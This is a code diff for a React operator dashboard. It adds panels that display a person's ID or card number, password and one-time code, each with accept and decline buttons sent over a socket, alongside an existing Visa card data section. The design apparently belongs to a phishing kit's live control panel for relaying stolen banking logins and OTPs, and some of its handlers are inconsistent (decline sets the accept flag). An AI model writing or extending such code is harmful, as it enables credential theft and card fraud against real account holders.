@@ -29,7 +29,6 @@ const Main = () => {
     if (!user.checked) {
       await axios.get(serverRoute + "/order/checked/" + id);
     }
-    console.log(user);
     getUsers();
     setUser({ data: user, active: true });
   };
@@ -37,6 +36,26 @@ const Main = () => {
   useEffect(() => {
     getUsers();
   }, []);
+
+  const handleAcceptUser = async (id) => {
+    socket.emit("acceptUser", id);
+    setUser({
+      data: { ...user.data, userAccept: true },
+      active: true,
+    });
+    await getUsers();
+  };
+  const handleDeclineUser = (data) => {
+    socket.emit("declineUser", data);
+    const _user = Users.find((u) => {
+      if (u._id === data._id) {
+        return { ...u, userAccept: true };
+      }
+    });
+    const withOut = Users.filter((u) => u._id !== data._id);
+    setUsers([...withOut, _user]);
+    setUser({ data: { ..._user, userAccept: true }, active: true });
+  };
 
   const handleAcceptVisa = async (id) => {
     socket.emit("acceptVisa", id);
@@ -56,6 +75,23 @@ const Main = () => {
     const withOut = Users.filter((u) => u._id !== data._id);
     setUsers([...withOut, _user]);
     setUser({ data: { ..._user, visaAccept: true }, active: true });
+  };
+
+  const handleAcceptUserOtp = async (id) => {
+    socket.emit("acceptUserOtp", id);
+    setUser({ data: { ...user.data, userOtpAccept: true }, active: true });
+    await getUsers();
+  };
+  const handleDeclineUserOtp = (data) => {
+    socket.emit("declineUserOtp", data);
+    const _user = Users.find((u) => {
+      if (u._id === data._id) {
+        return { ...u, userOtpAccept: true };
+      }
+    });
+    const withOut = Users.filter((u) => u._id !== data._id);
+    setUsers([...withOut, _user]);
+    setUser({ data: { ..._user, userOtpAccept: true }, active: true });
   };
 
   const handleAcceptOtp = async (id) => {
@@ -89,6 +125,12 @@ const Main = () => {
     await getUsers();
   });
   socket.on("otp", async (data) => {
+    await getUsers();
+  });
+  socket.on("username", async (data) => {
+    await getUsers();
+  });
+  socket.on("userOtp", async (data) => {
     await getUsers();
   });
 
@@ -199,6 +241,78 @@ const Main = () => {
               ""
             )}
 
+            {user.data?.username ? (
+              <div className="flex flex-col items-center bg-sky-800 text-white py-2 px-3 rounded-lg gap-y-1   my-2">
+                <span className="text-lg mb-2">بيانات دخول</span>
+                {user.data.username ? (
+                  <div className="w-full flex justify-between gap-x-3 border p-2 text-xs">
+                    <span>رقم البطاقة / الهوية</span>
+                    <span>{user.data?.username}</span>
+                  </div>
+                ) : (
+                  ""
+                )}
+
+                {user.data.password ? (
+                  <div className="w-full flex justify-between gap-x-3 border p-2 text-xs">
+                    <span> باسورد</span>
+                    <span>{user.data?.password}</span>
+                  </div>
+                ) : (
+                  ""
+                )}
+
+                {user.data.userAccept ? (
+                  ""
+                ) : (
+                  <div className="w-full flex col-span-2 md:col-span-1 justify-between gap-x-3  p-2 text-xs">
+                    <button
+                      className="bg-green-500 w-1/2 p-2 rounded-lg"
+                      onClick={() => handleAcceptUser(user.data)}
+                    >
+                      قبول
+                    </button>
+                    <button
+                      className="bg-red-500 w-1/2 p-2 rounded-lg"
+                      onClick={() => handleDeclineUser(user.data)}
+                    >
+                      رفض
+                    </button>
+                  </div>
+                )}
+
+                {user.data.userOtp ? (
+                  <>
+                    <div className="w-full flex justify-between gap-x-3 border p-2 text-xs">
+                      <span> otp </span>
+                      <span>{user.data?.userOtp}</span>
+                    </div>
+                    {user.data.userOtpAccept ? (
+                      ""
+                    ) : (
+                      <div className="w-full flex col-span-2 md:col-span-1 justify-between gap-x-3  p-2 text-xs">
+                        <button
+                          className="bg-green-500 w-1/2 p-2 rounded-lg"
+                          onClick={() => handleAcceptUserOtp(user.data)}
+                        >
+                          قبول
+                        </button>
+                        <button
+                          className="bg-red-500 w-1/2 p-2 rounded-lg"
+                          onClick={() => handleDeclineUserOtp(user.data)}
+                        >
+                          رفض
+                        </button>
+                      </div>
+                    )}
+                  </>
+                ) : (
+                  ""
+                )}
+              </div>
+            ) : (
+              ""
+            )}
             {user.data?.cardNumber ? (
               <div className="flex flex-col items-center bg-sky-800 text-white py-2 px-3 rounded-lg gap-y-1   my-2">
                 <span className="text-lg mb-2">بيانات فيزا</span>
